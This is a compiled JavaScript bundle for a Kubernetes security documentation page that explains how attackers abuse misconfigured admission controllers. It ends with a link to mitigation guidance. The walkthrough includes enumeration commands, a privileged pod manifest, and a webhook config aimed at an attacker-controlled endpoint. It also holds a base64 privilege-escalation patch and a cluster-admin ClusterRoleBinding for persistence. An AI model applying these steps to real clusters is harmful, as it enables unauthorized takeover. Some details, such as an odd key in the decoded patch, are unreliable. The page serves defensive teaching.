"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[5223],{8323:(e,s,i)=>{i.r(s),i.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>r,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"attack_vectors/misconfigured_admission_controllers","title":"Misconfigured Admission Controllers","description":"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies.","source":"@site/docs/attack_vectors/misconfigured_admission_controllers.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/misconfigured_admission_controllers","permalink":"/k8s_security/docs/attack_vectors/misconfigured_admission_controllers","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/misconfigured_admission_controllers.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","sidebarPosition":12,"frontMatter":{"sidebar_position":12,"title":"Misconfigured Admission Controllers","description":"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."},"sidebar":"default","previous":{"title":"Unrestricted etcd Access","permalink":"/k8s_security/docs/attack_vectors/unrestricted_etcd_access"},"next":{"title":"Denial of Service (DoS) Attacks","permalink":"/k8s_security/docs/attack_vectors/ddos_attacks"}}');var t=i(4848),o=i(8453);const r={sidebar_position:12,title:"Misconfigured Admission Controllers",description:"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."},a="Misconfigured Admission Controllers",c={},l=[{value:"Exploitation Steps: Abusing Misconfigured Admission Controllers",id:"exploitation-steps-abusing-misconfigured-admission-controllers",level:2},{value:"Step 1: Identify Disabled or Weak Admission Controllers",id:"step-1-identify-disabled-or-weak-admission-controllers",level:3},{value:"Step 2: Exploit Weak Admission Policies",id:"step-2-exploit-weak-admission-policies",level:3},{value:"Step 3: Hijack Admission Webhooks",id:"step-3-hijack-admission-webhooks",level:3},{value:"Step 4: Inject Malicious Configurations",id:"step-4-inject-malicious-configurations",level:3},{value:"Step 5: Gain Persistent Cluster Access",id:"step-5-gain-persistent-cluster-access",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.header,{children:(0,t.jsx)(s.h1,{id:"misconfigured-admission-controllers",children:"Misconfigured Admission Controllers"})}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.strong,{children:"Admission controllers"})," in Kubernetes enforce security policies before resources are created or modified. If ",(0,t.jsx)(s.strong,{children:"misconfigured"}),", attackers can ",(0,t.jsx)(s.strong,{children:"bypass security controls, escalate privileges, or manipulate cluster configurations"}),"."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h2,{id:"exploitation-steps-abusing-misconfigured-admission-controllers",children:"Exploitation Steps: Abusing Misconfigured Admission Controllers"}),"\n",(0,t.jsxs)(s.p,{children:["An attacker exploits ",(0,t.jsx)(s.strong,{children:"insecure Kubernetes admission controllers"})," to weaken security policies and gain unauthorized access."]}),"\n",(0,t.jsx)(s.h3,{id:"step-1-identify-disabled-or-weak-admission-controllers",children:"Step 1: Identify Disabled or Weak Admission Controllers"}),"\n",(0,t.jsxs)(s.p,{children:["The attacker lists all active ",(0,t.jsx)(s.strong,{children:"admission controllers"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl api-versions | grep admission\n"})}),"\n",(0,t.jsxs)(s.p,{children:["They check the API server arguments for ",(0,t.jsx)(s.strong,{children:"disabled controllers"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"ps aux | grep kube-apiserver\n"})}),"\n",(0,t.jsxs)(s.p,{children:["If critical controllers like ",(0,t.jsx)(s.strong,{children:"PodSecurity"}),", ",(0,t.jsx)(s.strong,{children:"ValidatingAdmissionWebhook"}),", or ",(0,t.jsx)(s.strong,{children:"MutatingAdmissionWebhook"})," are missing, the attacker proceeds."]}),"\n",(0,t.jsx)(s.h3,{id:"step-2-exploit-weak-admission-policies",children:"Step 2: Exploit Weak Admission Policies"}),"\n",(0,t.jsxs)(s.p,{children:["If ",(0,t.jsx)(s.strong,{children:"PodSecurity admission"})," is enabled but misconfigured, the attacker ",(0,t.jsx)(s.strong,{children:"deploys a privileged pod"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-yaml",children:"apiVersion: v1\nkind: Pod\nmetadata:\n  name: attacker-pod\nspec:\n  containers:\n    - name: exploit-container\n      image: alpine\n      securityContext:\n        privileged: true\n"})}),"\n",(0,t.jsxs)(s.p,{children:["Without proper admission control enforcement, the attacker ",(0,t.jsx)(s.strong,{children:"gains root access"})," to the Kubernetes node."]}),"\n",(0,t.jsx)(s.h3,{id:"step-3-hijack-admission-webhooks",children:"Step 3: Hijack Admission Webhooks"}),"\n",(0,t.jsxs)(s.p,{children:["The attacker lists active ",(0,t.jsx)(s.strong,{children:"Validating and Mutating Webhook Configurations"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl get mutatingwebhookconfigurations\nkubectl get validatingwebhookconfigurations\n"})}),"\n",(0,t.jsxs)(s.p,{children:["They inspect webhooks for ",(0,t.jsx)(s.strong,{children:"insecure configurations"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"kubectl describe mutatingwebhookconfiguration <webhook-name>\n"})}),"\n",(0,t.jsxs)(s.p,{children:["If a webhook allows ",(0,t.jsx)(s.strong,{children:"unauthenticated external access"}),", the attacker ",(0,t.jsx)(s.strong,{children:"modifies its behavior"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-yaml",children:'apiVersion: admissionregistration.k8s.io/v1\nkind: MutatingWebhookConfiguration\nmetadata:\n  name: insecure-webhook\nwebhooks:\n  - name: insecure.example.com\n    rules:\n      - apiGroups: [""]\n        resources: ["pods"]\n        operations: ["CREATE"]\n    clientConfig:\n      url: "http://attacker-controlled-endpoint/webhook"\n'})}),"\n",(0,t.jsxs)(s.p,{children:["The attacker sets up a ",(0,t.jsx)(s.strong,{children:"rogue webhook server"})," to modify API requests dynamically."]}),"\n",(0,t.jsx)(s.h3,{id:"step-4-inject-malicious-configurations",children:"Step 4: Inject Malicious Configurations"}),"\n",(0,t.jsxs)(s.p,{children:["If the webhook ",(0,t.jsx)(s.strong,{children:"modifies pod security settings"}),", the attacker ",(0,t.jsx)(s.strong,{children:"injects privileged configurations"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-json",children:'{\n  "apiVersion": "admission.k8s.io/v1",\n  "kind": "AdmissionReview",\n  "response": {\n    "allowed": true,\n    "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvdGVtcGxhdGUvc2VjdXJpdHlDb250ZXh0IiwidmFsdWUiOnsiYnJ1bnRhaW5lc2NhcGVzIjp7ImFsbG93UHJpdmlsZWdlZEVzY2FsYXRpb24iOnRydWV9fX1d"\n  }\n}\n'})}),"\n",(0,t.jsxs)(s.p,{children:["This ensures that every new pod ",(0,t.jsx)(s.strong,{children:"automatically runs with elevated privileges"}),"."]}),"\n",(0,t.jsx)(s.h3,{id:"step-5-gain-persistent-cluster-access",children:"Step 5: Gain Persistent Cluster Access"}),"\n",(0,t.jsxs)(s.p,{children:["By modifying webhook rules, the attacker ensures that ",(0,t.jsx)(s.strong,{children:"any newly deployed pod automatically grants itself cluster-admin privileges"}),":"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: attacker-binding\nsubjects:\n  - kind: User\n    name: attacker\n    apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,t.jsxs)(s.p,{children:["Even if the attacker's original access is revoked, ",(0,t.jsx)(s.strong,{children:"malicious webhook behavior remains active"}),", ensuring long-term persistence."]}),"\n",(0,t.jsx)(s.h3,{id:"result",children:"Result"}),"\n",(0,t.jsxs)(s.p,{children:["The attacker successfully ",(0,t.jsx)(s.strong,{children:"bypassed admission controls, manipulated security policies, and escalated privileges"})," using insecure admission webhooks."]}),"\n",(0,t.jsx)(s.hr,{}),"\n",(0,t.jsx)(s.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,t.jsxs)(s.p,{children:["To protect against ",(0,t.jsx)(s.strong,{children:"misconfigured admission controllers and insecure webhooks"}),", follow the security best practices outlined in:"]}),"\n",(0,t.jsxs)(s.p,{children:["\u27a1 ",(0,t.jsx)(s.strong,{children:(0,t.jsx)(s.a,{href:"/k8s_security/docs/best_practices/cluster_setup_and_hardening/api_server_security/misconfigured_admission_controllers_mitigation",children:"Securing Kubernetes Admission Controllers and Webhooks"})})]}),"\n",(0,t.jsxs)(s.p,{children:["This guide covers techniques such as ",(0,t.jsx)(s.strong,{children:"enforcing admission control best practices, securing webhook authentication, enabling TLS encryption, and auditing webhook activity"})," to prevent unauthorized modifications to cluster configurations."]})]})}function u(e={}){const{wrapper:s}={...(0,o.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,s,i)=>{i.d(s,{R:()=>r,x:()=>a});var n=i(6540);const t={},o=n.createContext(t);function r(e){const s=n.useContext(o);return n.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),n.createElement(o.Provider,{value:s},e.children)}}}]);